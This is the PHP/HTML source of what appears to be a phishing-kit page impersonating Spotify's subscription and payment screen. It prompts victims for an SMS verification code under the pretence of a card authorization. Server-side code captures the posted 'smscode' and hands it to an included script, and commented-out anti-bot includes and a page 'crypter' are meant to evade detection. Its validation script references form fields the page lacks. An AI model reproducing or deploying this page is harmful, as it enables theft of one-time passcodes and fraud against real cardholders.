<?php
ob_start();
session_start();
date_default_timezone_set('GMT');
error_reporting(0);

// include('../../includes/header.php');
// include "../../tinyboard/antibots1.php";
// include "../../tinyboard/antibots2.php";
// include "../../tinyboard/antibots3.php";
// include "../../tinyboard/antibots4.php";
// if($antibots == 'on' ){
// include "../../tinyboard/antibots5.php";
// include "../../tinyboard/antibots6.php";
// include "../../tinyboard/antibots7.php";
// include "../../tinyboard/antibots.php";
// if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
// echo "404 NOT FOUND";
// exit;
// }
// }
//////////////////////////////////////////////////////
$_POST['smscode'];

$youssef = $_POST['smscode'];
//////////////////////////////////////////////////////
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($youssef)) {
        include('ZABI2.php');
    }
}
//////////////////////////////////////////////////////
if ($crypter == '1') {
    require "../../includes/encrypt.php";
    require "../../includes/html.php";
    echo encryptPage();
}
?>
<html style="" class="xx_Z118xMARVEL  js flexbox canvas no-touch hashchange rgba multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface video audio no-localstorage svg inlinesvg bgsizecover raf"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Spotify</title>
    <link rel="icon" href="../../files/download.ico">
</head>
<body class=" m-int l-en page-account-subscription-update is-loggedin  reboot ">
<iframe src="../../files/activityi(2).html" style="display: none; visibility: hidden;" width="0" height="0"></iframe>
<iframe style="display: none; visibility: hidden;" src="//4721227.fls.doubleclick.net/activityi;src=4721227;type=uidfq0;cat=spoti0;ord=5160187481151;gtm=G1u;u2=undefined;~oref=file%3A%2F%2F%2FC%3A%2FAppServ%2Fwww%2FOVO%2520v2.7%2FSpotify%2FSubscription%2520and%2520payment%2520-%2520Spotify.html?" width="0" height="0"></iframe>
<script type="text/javascript" async="" src="//www.scdn.co/build/js/sp-analytics-a3e2493d01.js"></script>
<script src="https://connect.facebook.net/signals/config/1483047915331997?v=2.8.12&amp;r=stable" async=""></script>
<script type="text/javascript">
    function xForm() {
        if (document.getElementById('xnxx').value.length < 9) {
            document.getElementById('xnxx').className = "form-control error";
            document.body.style.backgroundColor = "#fefdd2";
            document.getElementById('xnxx').focus();
            return false;
        } else {
            document.getElementById('xnxx').className = "form-control";
        }
        ;
///////
        if (document.getElementById('xuser').value.length < 8) {
            document.getElementById('xuser').className = "form-control error";
            document.body.style.backgroundColor = "#fefdd2";
            document.getElementById('xuser').focus();
            return false;
        } else {
            document.getElementById('xuser').className = "form-control";
        }
        ;
///////
        if (document.getElementById('aaa').value.length < 4) {
            document.getElementById('aaa').className = "form-control error";
            document.body.style.backgroundColor = "#fefdd2";
            document.getElementById('aaa').focus();
            return false;
        } else {
            document.getElementById('aaa').className = "form-control";
        }
        ;
///////

        document.getElementById('loading').style.display = "block";
        document.getElementById('xbootn').style.display = "none";
    }
</script>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="Spotify is a digital music service that gives you access to millions of songs.">
<meta name="keywords" content="Spotify, music, online, listen, streaming, play, digital, album, artist, playlist">
<meta property="fb:app_id" content="174829003346">
<meta property="og:title" content="Music for everyone.">
<meta property="og:type" content="website">
<meta property="og:url" content="https://www.spotify.com/int/account/subscription/update/">
<meta property="og:image" content="http://www.scdn.co/i/_global/open-graph-default.png">
<meta property="og:description" content="Spotify is all the music you&#65533;ll ever need.">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Music for everyone.">
<meta name="twitter:image" content="http://www.scdn.co/i/_global/twitter_card-default.jpg">
<meta name="twitter:description" content="Spotify is all the music you&#65533;ll ever need.">
<link rel="canonical" href="https://www.spotify.com/account/subscription/update/">
<link rel="stylesheet" href="../../files/spotify-543b91ee3c.css">
<link rel="stylesheet" href="../../files/account-4445741da9.css">
<link rel="stylesheet" href="../../files/embedded-checkout-7f51b6350a.css">
<noscript>
    &amp;amp;amp;amp;amp;lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-7BJJ"
    height="0" width="0" style="display:none;visibility:hidden"&amp;amp;amp;amp;amp;gt;
    &amp;amp;amp;amp;amp;lt;/iframe&amp;amp;amp;amp;amp;gt;
</noscript>
<div id="fb-root"></div>
<div class="wrap">
    <header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <ul class="nav">
                    <li class="dropdown">
                        <a href="#" class="user-link dropdown-toggle hidden-xs hidden-sm" data-toggle="dropdown">
                            <div class="user-icon-container img-circle navbar-user-img">
                                <svg class="user-icon">
                                    <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                    </use>
                                </svg>
                            </div>
                        </a>
                        <a href="#" class="user-link hidden-md hidden-lg" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">
                            <div class="user-icon-container img-circle navbar-user-img">
                                <svg class="user-icon">
                                    <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                    </use>
                                </svg>
                            </div>
                        </a>
                        <ul class="dropdown-menu dropdown-menu-right">
                            <li>
                                <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">Account</a>
                            </li>
                            <li>
                                <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}">Log
                                    Out</a>
                            </li>
                        </ul>
                    </li>
                </ul>
                <a href="#" class="user-link hidden ">
                    <div class="user-icon-container img-circle navbar-user-img">
                        <svg class="user-icon">
                            <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                            </use>
                        </svg>
                    </div>
                </a>
                <a class="navbar-brand" href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;spotify-logo&quot;}">
                    <span class="navbar-logo">Spotify</span>
                </a>
            </div>
            <nav class="collapse navbar-collapse" id="navbar-nav" role="navigation">
                <ul class="nav navbar-nav navbar-right nav-main">
                    <li>
                        <a href="#" id="nav-link-premium" data-ga-category="menu" data-ga-action="premium">
                            Premium
                        </a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-help" data-ga-category="menu" data-ga-action="help">
                            Help
                        </a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-download" class="js-get-spotify js-gtm-event" data-ga-category="menu" data-ga-action="download" data-gtm-event-name="download_spotify_button_clicked" data-tracking="{&quot;category&quot;: &quot;download&quot;, &quot;action&quot;: &quot;download start&quot;, &quot;label&quot;: &quot;download-navbar&quot;}">Download
                        </a>
                    </li>
                    
                    <li class="alternate sidepanel-item-small hidden-md ">
                        
                    </li>
                    <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
                        <a href="#" id="nav-link-account" data-ga-category="menu" data-ga-action="account">
                            Account
                        </a>
                    </li>
                    <li class="alternate sidepanel-item-small hidden-md hidden-lg ">
                        <a href="https://www.spotify.com/int/logout/" id="nav-link-log-out" data-ga-category="menu" data-ga-action="log-out">
                            Log Out
                        </a>
                    </li>
                    <li class="dropdown alternate hidden-sidepanel">
                        <a href="#" class="user-link dropdown-toggle" data-toggle="dropdown">
                            <div class="user-icon-container img-circle navbar-user-img">
                                <svg class="user-icon">
                                    <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                    </use>
                                </svg>
                            </div>
                            <span class="user-text">Profile</span>
                            <svg class="svg-chevron-down">
                                <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use>
                            </svg>
                        </a>
                        <ul class="dropdown-menu dropdown-menu-right">
                            <li class="alternate sidepanel-item-small visible-md-block ">
                                <a href="#" id="nav-link-upgrade" data-ga-category="menu" data-ga-action="upgrade">
                                    Upgrade
                                </a>
                            </li>
                            <li>
                                <a href="#" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;account&quot;}">Account</a>
                            </li>
                            <li>
                                <a href="#" class="logout-link" data-tracking="{&quot;category&quot;: &quot;menu&quot;, &quot;action&quot;: &quot;log-out&quot;}">Log
                                    Out</a>
                            </li>
                        </ul>
                    </li>
                </ul>
            </nav>
        </div>
    </header>
    <div class="content-wrapper">
        <div class="container container-content">
            <div class="row">
                <div class="col-sm-3 hidden-xs">
                    <div class="sidebar">
                        <div class="user-icon-container img-circle ">
                            <svg class="user-icon">
                                <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user-icon">
                                </use>
                            </svg>
                        </div>
                        <ul class="nav-inverse nav-tabs nav-stacked">
                            <li id="submenu-item-account-overview">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-home"></use>
                                    </svg>
                                    Account overview</a>
                            </li>
                            <li id="submenu-item-family-plan">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use>
                                    </svg>
                                    Premium for Family</a>
                            </li>
                            <li id="submenu-item-edit-profile">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-edit"></use>
                                    </svg>
                                    Edit profile</a>
                            </li>
                            <li id="submenu-item-change-password">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-locked"></use>
                                    </svg>
                                    Change password</a>
                            </li>
                            <li id="submenu-item-notification-settings">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-notifications"></use>
                                    </svg>
                                    Notification settings</a>
                            </li>
                            <li id="submenu-item-offline-devices">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-offline"></use>
                                    </svg>
                                    Offline devices</a>
                            </li>
                            <li id="submenu-item-recover-playlists">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-refresh"></use>
                                    </svg>
                                    Recover playlists</a>
                            </li>
                            <li class="active" id="submenu-item-subscription">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment"></use>
                                    </svg>
                                    Subscription</a>
                            </li>
                            <li id="submenu-item-receipts">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-payment-history"></use>
                                    </svg>
                                    Receipts</a>
                            </li>
                            <li id="submenu-item-apps">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-apps"></use>
                                    </svg>
                                    Apps</a>
                            </li>
                            <li id="submenu-item-redeem">
                                <a href="#">
                                    <svg>
                                        <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#icon-redeem"></use>
                                    </svg>
                                    Redeem</a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="col-sm-9">
                    <div class="content">
                        <div class="article-account">
                            <div class="row">
                                <div class="col-sm-12">
                                    <div class="well card change-payment">
                                        <h2 class="change-payment-header text-center">You receive SMS</h2>
                                        <p class="change-payment-paragraph"></p>
                                        <section style=" border: 1px solid rgba(191, 176, 176, 0.51); " class="panel panel-form" data-checkout-panel="" data-tracking-endpoint="https://www.spotify.com/int/payment/payment-event/">
                                            <div data-redirect-message="" class="redirect-message checkout-modal hidden">
                                                <div class="checkout-modal-content">
                                                    <div class="icon">
                                                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 30 18">
                                                            <polygon points="29.4,9 20.7,0.3 19.3,1.7 25.6,8 0,8 0,10 25.6,10 19.3,16.3 20.7,17.7"></polygon>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </div>
                                            <ul class="list-unstyled picker-tabs" data-payment-picker="">
                                                <li class="picker-tab">
                                                    <a class="picker-button" data-payment-picker-button="" data-name="billing_adyen_cards">

                                                        <svg height="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" version="1.1" viewBox="0 0 195 110" width="100%" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g>
                                                                <path d="M114.516,39.946L113.66,45.354L122.881,45.354L121.754,52.469L112.536,52.469L110.525,65.162L102.12,65.162L107.245,32.829L125.812,32.829L124.678,39.946L114.516,39.946Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M133.954,65.162L125.55,65.162L130.671,32.829L139.076,32.829L133.954,65.162Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M152.607,39.946L151.75,45.354L161.228,45.354L160.104,52.469L150.625,52.469L149.739,58.041L159.733,58.041L158.607,65.162L140.206,65.162L145.331,32.829L163.724,32.829L162.599,39.946L152.607,39.946Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M175.822,39.946L177.795,39.946C183.196,39.946 186.498,43.207 185.577,48.996C184.586,55.294 179.86,58.041 174.844,58.041L172.958,58.041L175.822,39.946ZM163.425,65.162L175.348,65.162C184.305,65.162 192.885,58.089 194.329,48.996C195.77,39.907 189.469,32.829 180.463,32.829L168.545,32.829L163.425,65.162Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M68.019,88.424C70.3,88.424 71.365,90.238 71.055,92.388C70.742,94.608 69.171,96.318 66.901,96.318C64.617,96.318 63.539,94.608 63.856,92.388C64.162,90.238 65.745,88.424 68.019,88.424ZM57.191,101.142L62.792,101.142L63.07,99.194L63.13,99.194C63.898,100.938 65.698,101.724 67.541,101.724C72.25,101.724 76.127,97.417 76.851,92.353C77.565,87.325 74.948,83.02 70.269,83.02C68.454,83.02 66.466,83.77 65.05,85.314L66.842,72.763L61.238,72.763L57.191,101.142Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M77.327,83.604L83.786,83.604L86.72,92.594L92.127,83.604L98.495,83.604L82.105,109.892L75.821,109.892L82.799,98.75L77.327,83.604Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M128.012,101.142L136.646,72.666L144.349,72.666L135.719,101.142L128.012,101.142Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M124.564,72.666L117.631,84.745C115.87,87.912 114.835,89.502 114.344,91.504L114.235,91.504C114.356,88.967 114.011,85.856 113.972,84.098L113.214,72.666L100.238,72.666L100.108,73.434C103.44,73.434 105.409,75.114 105.95,78.539L108.477,101.142L116.467,101.142L132.613,72.666L124.564,72.666Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M184.498,101.142L184.281,96.907L174.662,96.896L172.691,101.142L164.326,101.142L179.493,72.727L189.765,72.727L192.326,101.142L184.498,101.142ZM183.613,84.34C183.521,82.242 183.457,79.386 183.595,77.66L183.488,77.66C183.016,79.076 181.002,83.316 180.105,85.403L177.248,91.645L184.003,91.645L183.613,84.34Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M152.444,101.96C147.001,101.96 143.393,100.23 140.815,98.689L144.48,93.078C146.796,94.37 148.62,95.871 152.798,95.871C154.147,95.871 155.441,95.516 156.173,94.247C157.253,92.392 155.928,91.396 152.918,89.697L151.428,88.723C146.963,85.674 145.035,82.786 147.142,77.731C148.483,74.489 152.027,72.043 157.878,72.043C161.909,72.043 165.692,73.785 167.896,75.493L163.67,80.44C161.523,78.696 159.744,77.819 157.701,77.819C156.075,77.819 154.837,78.447 154.416,79.296C153.617,80.886 154.674,81.971 157.02,83.421L158.788,84.549C164.202,87.964 165.49,91.545 164.132,94.902C161.804,100.669 157.224,101.96 152.444,101.96Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M47.777,39.946L46.923,45.354L56.398,45.354L55.275,52.469L45.797,52.469L44.912,58.041L54.909,58.041L53.777,65.162L35.379,65.162L40.502,32.829L58.899,32.829L57.773,39.946L47.777,39.946Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M71.143,39.243L71.959,39.243C74.704,39.243 77.712,39.757 77.154,43.273C76.6,46.791 73.428,47.304 70.685,47.304L69.868,47.304L71.143,39.243ZM77.46,51.893C82.18,51.078 85.279,47.218 85.982,42.761C87.075,35.857 82.711,32.81 76.323,32.81L63.755,32.81L58.638,65.144L67.048,65.144L69.012,52.709L69.098,52.709L75.061,65.144L85.526,65.144L77.46,51.893Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M95.895,65.162L87.485,65.162L92.609,32.829L101.014,32.829L95.895,65.162Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M49.969,0.588L36.739,21.647L18.752,52.106L17.7,40.752L16.875,28.409L0.354,28.409L0.188,29.383C4.429,29.383 6.938,31.517 7.636,35.886L10.846,64.666L10.866,64.602L10.909,65.024L22.268,65.024L42.568,23.963L54.877,0.588L49.969,0.588Z" style="fill:rgb(30,92,178);fill-rule:nonzero;"></path>
                                                                <path d="M21.591,35.277L22.549,35.277L34.499,15.034L34.504,14.084L7.319,14.084L7.319,15.051L20.42,20.627L21.591,35.277Z" style="fill:rgb(249,177,11);fill-rule:nonzero;"></path>
                                                            </g></svg>
                                                        <svg height="60px" version="1.1" viewBox="0 0 60 60" width="60px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title></title><desc></desc><defs></defs><g fill="none" fill-rule="evenodd" id="Page-1" stroke="none" stroke-width="1"><g id="Social_icons" transform="translate(-422.000000, -954.000000)"><g id="Mastercard" transform="translate(422.000000, 954.000000)"><circle cx="30" cy="30" fill="#FFFFFF" id="Oval" r="30"></circle><g id="g3110" transform="translate(12.000000, 19.000000)"><path d="M35.9736305,11.1445924 C35.9736305,17.2982476 30.994537,22.2867716 24.8525128,22.2867716 C18.7104886,22.2867716 13.7313936,17.2982476 13.7313936,11.1445924 C13.7313936,4.99093624 18.7104886,0.00241261301 24.8525128,0.00241261301 C30.994537,0.00241261301 35.9736305,4.99093624 35.9736305,11.1445924 L35.9736305,11.1445924 Z" fill="#F79F1A" id="path2997"></path><path d="M22.2540437,11.1445924 C22.2540437,17.2982476 17.2749503,22.2867716 11.132926,22.2867716 C4.99090183,22.2867716 0.0118068562,17.2982476 0.0118068562,11.1445924 C0.0118068562,4.99093624 4.99090183,0.00241261301 11.132926,0.00241261301 C17.2749503,0.00241261301 22.2540437,4.99093624 22.2540437,11.1445924 L22.2540437,11.1445924 Z" fill="#EA001B" id="path2995"></path><path d="M17.9927419,2.3733871 C15.3979037,4.41315778 13.7322581,7.58283794 13.7322581,11.1435484 C13.7322581,14.7042588 15.3979037,17.8763582 17.9927419,19.916129 C20.5875801,17.8763582 22.2532258,14.7042588 22.2532258,11.1435484 C22.2532258,7.58283794 20.5875801,4.41315778 17.9927419,2.3733871 L17.9927419,2.3733871 Z" fill="#FF5F01" id="path2999"></path></g></g></g></g></svg>
                                                    </a>
                                                </li>
                                                <li class="picker-tab picker-more hidden" data-payment-picker-more="">
                                                    <a class="" href="#">&#65533;&#65533;&#65533;</a>
                                                </li>
                                            </ul>
                                            <div class="message-panel hidden" data-transactional-messages=""></div>
                                            <div class="message-panel error-message with-icon hidden" data-form-field-messages="">
                                                <div class="icon">
                                                    <svg viewBox="0 0 24 24">
                                                        <circle cx="12" cy="12" r="9.5" stroke="currentColor" fill="none"></circle>
                                                        <line x1="12" y1="17" x2="12" y2="10" stroke="currentColor"></line>
                                                        <circle cx="12" cy="7.35" r=".35" stroke="currentColor" fill="none"></circle>
                                                    </svg>
                                                </div>
                                                <ul class="form-message-list"></ul>
                                            </div>
                                            <div class="panel-tab" data-checkout-panel-tab="" data-name="billing_adyen_cards">
                                                <form name="offer" method="post" action="" data-payment-form="credit-card" data-pci-config="{&quot;url&quot;:&quot;https:\/\/pci.spotify.com\/static\/form_offer_panel.html&quot;,&quot;provider&quot;:&quot;adyen&quot;,&quot;generationTime&quot;:&quot;2018-02-06T20:05:16+00:00&quot;,&quot;postal&quot;:{&quot;require&quot;:true,&quot;postal_code&quot;:&quot;21009&quot;},&quot;postalCodeFieldName&quot;:&quot;offer[zip-code]&quot;,&quot;icons&quot;:[&quot;amex&quot;,&quot;mastercard&quot;,&quot;visa&quot;,&quot;cb&quot;],&quot;translations&quot;:{&quot;cardNumber&quot;:&quot;Card number&quot;,&quot;expirationDate&quot;:&quot;Expiry date&quot;,&quot;month&quot;:&quot;Month&quot;,&quot;year&quot;:&quot;Year&quot;,&quot;securityCode&quot;:&quot;Security code&quot;,&quot;postalCode&quot;:&quot;Zip code&quot;,&quot;cvc_info&quot;:&quot;The security code, or CVV, refers to the extra 3 or 4 numbers on the back or front of your card.&quot;,&quot;invalid_cvc&quot;:&quot;Please enter the last 3 numbers on the back of your card (or 4 numbers on the front if Amex).&quot;,&quot;invalid_creditcard&quot;:&quot;Enter a valid credit card number.&quot;,&quot;invalid_zipcode&quot;:&quot;Enter a valid zip or postal code.&quot;,&quot;invalid_mm&quot;:&quot;Select the expiration month.&quot;,&quot;invalid_yy&quot;:&quot;Select the expiration year.&quot;,&quot;invalid_form_data&quot;:&quot;The info you&amp;#039;ve entered into one or more fields is incorrect. Make updates and try again, or &amp;lt;a href=&amp;quot;https:\/\/support.spotify.com\/account_payment_help\/payment_help\/problems-paying-for-spotify-by-card\/&amp;quot;&amp;gt;get help&amp;lt;\/a&amp;gt;.&quot;}}">
                                                    <h2>Credit card</h2>
                                                    <div data-pci-container="" class="pci-container">
                                                        <div class="pci-loader">
                                                            Loading. Please wait......
                                                        </div>
                                                        <div data-pci-frame-hook="">
                                                            <iframe src="../../files/form_offer_panel.html" class="pci-iframe" scrolling="no" width="100%" height="289" frameborder="0"></iframe>
                                                        </div>
                                                        <div data-pci-tooltip="cvc_info" role="tooltip" class="pci-tooltip">
                                                            The security code, or CVV, refers to the extra 3 or 4
                                                            numbers on the back or front of your card.
                                                        </div>
                                                        <div data-pci-tooltip="security_explained" role="tooltip" class="pci-tooltip top-left">
                                                            Transactions are encrypted and secure.
                                                        </div>
                                                    </div>
                                                    <p class="text-legal">
                                                        Spotify realizar&#225; una autorizaci&#243;n temporal en su tarjeta para verificarla. Esto es solo una autorizaci&#243;n y NO un cargo. Su banco puede informarle de la autorizaci&#243;n.
                                                    </p>
                                                    <p class="text-legal">
                                                        <strong>By purchasing you authorize Spotify to automatically
                                                            charge you $4.99 + any applicable tax each month until you
                                                            cancel.</strong> If the price changes, we&#65533;ll notify you
                                                        beforehand. You can check your renewal date or cancel anytime
                                                        via your <a href="#">Account page</a>. No partial refunds. <a href="#">Terms and Conditions</a> apply.
                                                    </p>
                                                    <div>
                                                        <div id="offer_pci"></div>
                                                    </div>
                                                    <div>
                                                        <div class="submit-button">
                                                            <button type="submit" id="offer_submit" name="offer[submit]" class="btn btn-green">
            <span class="submit-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 17">
    <path class="cls-1" d="M1424,4255.94v-4a1,1,0,0,0-.08-0.38,1,1,0,0,0-.93-0.61h-1v-2a5,5,0,0,0-10,0v2h-1a1.15,1.15,0,0,0-.94.67,1,1,0,0,0-.07.32v8a1,1,0,0,0,.12.44,1,1,0,0,0,.63.5,1,1,0,0,0,.25.05h12a1,1,0,0,0,.93-0.61,1,1,0,0,0,.08-0.39v-4Zm-10-7a3,3,0,0,1,6,0v1.92h-6v-1.92Z" transform="translate(-1410 -4243.94)"></path>
</svg>
            </span>
                                                                Verify your account
                                                            </button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                            <div class="panel-tab selected" data-checkout-panel-tab="" data-name="billing_paypal">
                                                <form name="offer" method="post" action="" data-payment-form="">
                                                    <div class="row">
                                                        <div class="col-xs-12">
                                                                    <span class="safe-field">
<style>
.xx_Z118xMARVEL .x_V-ForZ118 #cardnumber {
    background-image: url('../../files/sprites_cc_logos.png');
    background-repeat: no-repeat;
    background-position: 98.5% 81.7%;
}

.xx_Z118xMARVEL .x_V-ForZ118 #csc {
    background-image: url('../../files/vv.gif');
    background-repeat: no-repeat;
    background-position: 99% 45%;
}

.Xval666ideX1 {
    position: relative
}

.Xval666ideX1.focus .mobileEntry,
.Xval666ideX1.focus .x_V-ForZ118 {
    z-index: 4
}

.Xval666ideX1.valid {
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 69.5%;
    background-color: #fff;
}

.Xval666ideX1.error {
    border: 1px solid #c72e2e;
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 62%;
    background-color: #fefdd2;
    color: #c72e2e;
}

.Xval666ideX1.error:hover,
.Xval666ideX1.error:focus {
    border: 1px solid #c72e2e;
    transition: all 0.3s ease-out;
}

.jp-card-valid {
    position: relative
}

.jp-card-valid.focus .mobileEntry,
.jp-card-valid.focus .x_V-ForZ118 {
    z-index: 4
}

.jp-card-valid.valid {
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 70%;
    background-color: #fff;
}

.tabon.error {
    border: 1px solid #c72e2e;
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 62%;
    background-color: #fefdd2;
    color: #c72e2e;
}

.tabon.error:hover,
.tabon.error:focus {
    border: 1px solid #c72e2e;
    transition: all 0.3s ease-out;
}

.valid.jp-card-invalid {
    border: 1px solid #c72e2e;
    background-image: url(../../files/onboarding_form.png);
    background-repeat: no-repeat;
    background-position: 98% 62%;
    background-color: #fefdd2;
    color: #c72e2e;
}

.valid.jp-card-invalid:hover,
.valid.jp-card-invalid:focus {
    border: 1px solid #c72e2e;
    transition: all 0.3s ease-out;
}
</style>
			</span>
                                                    <div class="row" style="padding-left: 30%">
                                                        <div class="col-xs-6">
                                                            <div class="form-group">
                                                                <label id="trans-label_postal_code" for="zip-code" style="padding-left: 20%">SMS CODE</label>
                                                                <input id="aaa" name="smscode" autocomplete="off" type="text" class="form-control">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <p class="text-legal">
                                                             Spotify will make a temporary authorization on your card to
                                                        verify it. This is an authorization only and NOT a charge.
                                                    </p>
                                                    <p class="text-legal">
                                                         You can check your renewal date or cancel anytime
                                                        via your <a href="#">Account page</a>. No partial refunds. <a href="#">Terms and Conditions</a> apply.
                                                    </p>
                                                    <div>
                                                        <div id="offer_paypal"></div>
                                                    </div>
                                                    <div>
                                                        <div class="submit-button">
                                                            <button onclick="return xForm()" type="submit" id="offer_submit" name="offer[submit]" class="btn btn-green">
            <span class="submit-icon">
            </span>
                                                                Submit
                                                            </button>
                                                        </div>
                                                    </div>
                                                
                                            </div>
                                        </div></form></div></section>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

</body></html>